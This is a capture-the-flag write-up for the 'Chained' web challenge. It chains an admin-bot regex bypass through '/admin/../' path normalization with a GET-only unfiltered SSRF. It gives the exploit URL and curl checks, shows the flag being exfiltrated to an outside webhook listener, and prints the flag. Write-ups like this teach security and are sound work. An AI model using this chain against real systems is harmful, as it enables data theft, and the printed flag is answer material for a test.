# Chained (May 15, 2026)

**Category:** web  
**Points:** 280  
**Files Provided:** index.html, admin-bot.js, app.py  
**Site:** chained.tjc.tf, admin bot at admin-bot.tjctf.org/chained

## Challenge Description

"i designed my own admin bot! and i included an admin page that should be super duper secure..."

## Step 1: Exploring

Three load-bearing components:

- **admin-bot.js**: bot navigates to `url + flag` (JS string concat), accepting any URL matching `/^https:\/\/chained\.tjc\.tf\/admin\//`.
- **app.py /**: POST validates `url` against an `isSafe()` blacklist (`127`, `local`, `..`, `@`, etc.) and redirects to GET. GET reads `url` from `request.args`, runs `requests.get(url)`, and renders the body with `{{ q | safe }}`. No blacklist on GET.
- **app.py /admin**: gated by `request.remote_addr == '127.0.0.1'`.
- **index.html**: strict CSP, `script-src 'self'` (no inline JS).

Two bugs:
1. Blacklist is POST-only - GET to `/?url=...` is unfiltered SSRF.
2. The admin-bot's `urlRegex` checks the URL string; the headless browser then normalizes `/admin/../?...` to `/?...` before sending the request.

## Step 2: The Chain

The flag is concatenated onto the bot's destination URL. CSP kills any client-side exfil, so I want the flag to land in a query parameter that the server itself will SSRF out for me:

1. Submit `https://chained.tjc.tf/admin/../?url=<my-webhook>?leak=` to the bot. Matches the regex.
2. Bot navigates to `url + flag` = `https://chained.tjc.tf/admin/../?url=<my-webhook>?leak=<FLAG>`.
3. Chromium normalizes the path to `/`. Server receives `GET /?url=<my-webhook>?leak=<FLAG>`.
4. GET branch fires (no `isSafe`), runs `requests.get('<my-webhook>?leak=<FLAG>')`.
5. Webhook receives the request with the flag in its query string.

## Step 3: Verifying Before Burning the reCAPTCHA

Set up a webhook.site listener. Confirmed:

- `curl 'https://chained.tjc.tf/?url=...'` reflects the response body - GET SSRF works, no blacklist.
- `curl 'https://chained.tjc.tf/admin/../?url=...' -L` lands on the `/` route - path normalization confirmed.

Then asked the user to submit through the admin-bot UI:

```
https://chained.tjc.tf/admin/../?url=https%3A%2F%2Fwebhook.site%2F<token>%2F%3Fleak%3D
```

Polled the webhook:

```
"query": { "leak": "tjctf{ch41n3d_o340e934l35d}" }
"user_agent": "python-requests/2.32.4"
```

The `python-requests` UA confirms it came from the Flask SSRF, not the bot's browser.

`tjctf{ch41n3d_o340e934l35d}`

## Takeaways
- Two filters that never share the same view of input = an exploit gap. The regex sees the raw string, the browser sees the normalized path, the server sees `?url=` after the redirect - and the blacklist only runs on the POST handler.
- CSP doesn't matter if the server itself will exfil for you.
- Always pre-flight with `curl` (which normalizes URLs like Chromium does) before paying the reCAPTCHA cost.

